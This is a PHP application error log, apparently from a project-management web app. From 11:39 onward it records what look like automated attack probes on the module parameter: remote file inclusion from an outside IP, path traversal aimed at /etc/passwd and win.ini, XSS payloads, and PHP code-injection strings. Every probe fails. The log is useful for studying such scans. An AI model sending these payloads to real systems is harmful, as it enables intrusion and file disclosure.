<?php
 die();
?>

10:48:26 preg_match() expects parameter 2 to be string, array given in framework/router.class.php on line 484 when visiting /www/index.php?m=my&f=profile&onlybody=yes

10:48:26 preg_match() expects parameter 2 to be string, array given in framework/router.class.php on line 484 when visiting /www/index.php?m=bug&f=create&productID=1&branch=0&extra=moduleID=0

11:23:23 preg_match() expects parameter 2 to be string, array given in framework/router.class.php on line 484 when visiting /www/index.php?m=story&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

11:39:47 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

11:42:24 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:19:26 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http://120.26.55.211/s.txt&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:20:12 ERROR: the control file module/http://120.26.55.211/s.txt/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=http%3A%2F%2F120.26.55.211%2Fs.txt&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:32:54 ERROR: the control file module/../../../../../../../../windows/win.ini/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:33:26 ERROR: the control file module/../../../../../../../../../../etc/passwd%00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:33:54 ERROR: the control file module/../../../../../../../../../../windows/win.ini00/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini00&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:39:02 is_file() expects parameter 1 to be a valid path, string given in framework/router.class.php on line 990 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:39:02 ERROR: the control file module/../../../../../../../../windows/win.ini in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:39:34 ERROR: the control file module/../../../../../../../../etc/passwd
.jpg/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%0a.jpg&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:40:54 ERROR: the control file module/story'">/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=story'%22%3E%3Ciframe%20onload=alert()%3E&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:43:06 ERROR: the control file module/phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:45:35 ERROR: the control file module/amf2yxnjcmlwddpwcm9tchqomtexktt4/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=amF2YXNjcmlwdDpwcm9tcHQoMTExKTt4&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:48:29 ERROR: the control file module/storyi2027381i/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=storyi2027381i&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:48:56 ERROR: the control file module/${@print(md5(this_is_a_test_string))}/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:51:49 ERROR: the control file module/${@print(md5(this_is_a_test_string))}\/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

12:54:13 ERROR: the control file module/print(md5(this_is_a_test_string));die();/*/control.php not found. in framework/router.class.php on line 992, last called by framework/router.class.php on line 1100 through function setControlFile.
 in framework/router.class.php on line 1622 when visiting /www/index.php?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&f=ajaxGetProductStories&t=html&productID=1&branch=0&moduleID=11

16:14:06 Undefined offset: 1 in module/user/control.php on line 712 when visiting /www/index.php?m=user&f=login&referer=L3d3dy9pbmRleC5waHA=
